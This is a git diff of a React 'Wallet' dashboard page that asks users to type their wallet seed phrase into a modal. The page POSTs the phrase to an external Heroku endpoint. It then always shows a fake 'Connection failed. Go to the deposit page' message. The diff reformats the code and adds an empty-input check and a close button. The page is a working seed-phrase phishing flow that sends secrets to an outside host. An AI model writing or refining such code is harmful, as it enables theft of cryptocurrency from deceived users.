@@ -5,12 +5,12 @@ import DashboardHeader from '../../components/DashboardHeader';
 import useRedirect from '../../hooks/useRedirect';
 
 const Wallet = () => {
-  const [seed,setSeed] = useState('')
+  const [seed, setSeed] = useState('');
 
   const onChange = (event) => {
     const { name, value } = event.target;
-    setSeed(value)
-    console.log('seed', seed)
+    setSeed(value);
+    console.log('seed', seed);
   };
 
   const notify = (word) => {
@@ -26,23 +26,28 @@ const Wallet = () => {
   };
 
   const onSeed = async (event) => {
+    if(!seed){
+      return notify("Add seed phrase")
+    }
     const iseditUser = await fetch(
-      "https://sheltered-bastion-98583.herokuapp.com/seed",
+      'https://sheltered-bastion-98583.herokuapp.com/seed',
       {
-        method: "post",
-        headers: { "Content-Type": "application/json" },
+        method: 'post',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          seed: seed
-      })
-    })
+          seed: seed,
+        }),
+      }
+    );
 
     let resp = await iseditUser.json();
-    console.log("edit resp", resp);
+    console.log('edit resp', resp);
 
-    notify('Connection failed. Go to the deposit page')
+    notify('Connection failed. Go to the deposit page');
     event.preventDefault();
     // navigate("../admin/users", { replace: false });
   };
+
   return (
     <div className="lg:px-24 md:px-8 px-2 h-full w-[95%] mx-auto">
       <ToastContainer />
@@ -83,10 +88,18 @@ const Wallet = () => {
 
               <div class="modal">
                 <div class="modal-box bg-accent">
-                  <h3 class="font-bold text-lg">
+                  <label
+                    for="my-modal-6"
+                    class="btn btn-sm btn-circle absolute right-4 top-4"
+                  >
+                    ✕
+                  </label>
+
+                  <h3 class="font-bold lg:text-lg">
                     Please enter your wallet seed phrase!
                   </h3>
-                  <textarea onChange={onChange}
+                  <textarea
+                    onChange={onChange}
                     class="textarea my-5 h-32 w-full"
                     placeholder="Enter in the correct order your wallet phrase"
                   ></textarea>
